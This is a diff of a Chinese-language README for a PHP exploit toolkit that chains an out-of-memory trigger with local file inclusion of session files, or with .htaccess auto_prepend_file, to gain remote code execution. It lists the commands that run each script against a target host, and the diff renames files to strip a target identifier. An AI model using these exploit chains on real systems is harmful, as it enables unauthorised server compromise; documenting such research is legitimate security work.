@@ -109,10 +109,10 @@ session.use_strict_mode = 0   ; 預設接受任意 session ID
 2. GET /vuln.php?file=/var/lib/php/session/sess_<SID> → include → RCE
 ```
 
-**腳本**：`exploit_112.py`
+**腳本**：`exploit_lfi.py`
 
 ```bash
-TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 exploit_112.py
+TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 exploit_lfi.py
 ```
 
 ### 方式二：OOM + .htaccess auto_prepend_file（需 SSH）
@@ -140,7 +140,7 @@ TARGET_HOST=10.0.0.1 SSH_USER=admin SSH_PASS=secret python3 http_rce_default.py
 只測試 OOM 是否能觸發（不嘗試 RCE）：
 
 ```bash
-TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom_112.py
+TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom.py
 ```
 
 ## 環境變數
@@ -171,21 +171,21 @@ TARGET_HOST=10.0.0.1 TARGET_PORT=443 python3 test_oom_112.py
 ## 檔案結構
 
 ```
-├── exploit_112.py           ← 純 HTTP RCE（OOM + LFI，無需 SSH）
+├── exploit_lfi.py           ← 純 HTTP RCE（OOM + LFI，無需 SSH）
 ├── http_rce.py              ← HTTP RCE + SSH（lab-tuned php.ini）
 ├── http_rce_default.py      ← HTTP RCE + SSH（stock php.ini，.htaccess override）
-├── test_oom_112.py          ← 獨立 OOM 觸發測試
+├── test_oom.py          ← 獨立 OOM 觸發測試
 ├── exploit.py               ← GDB 輔助單漏洞 RCE（詳見 gdb-exploit.md）
 ├── README.md                ← 本文件（HTTP 雙漏洞路線）
 ├── gdb-exploit.md           ← GDB 單漏洞路線：記憶體位址解析與 payload 佈局
 ├── RESULTS.md               ← 實機測試結果
-├── target-112-analysis.md   ← 攻擊面分析（CentOS + WordPress 黑盒）
+├── target-analysis.md   ← 攻擊面分析（CentOS + WordPress 黑盒）
 └── rce-chain-design-*.md    ← RCE 鏈路設計文件
 ```
 
 ## 限制
 
-- **LFI 版本** (`exploit_112.py`)：需要目標存在 LFI 向量
+- **LFI 版本** (`exploit_lfi.py`)：需要目標存在 LFI 向量
 - **.htaccess 版本** (`http_rce.py`, `http_rce_default.py`)：需要 SSH + Apache AllowOverride All
 - **PHP 預設設定下無法單獨觸發 OOM**：需要 `post_max_size ≥ memory_limit`
 - **GDB 版本** (`exploit.py`)：需要 SSH + sudo + debug symbols，詳見 [gdb-exploit.md](gdb-exploit.md)
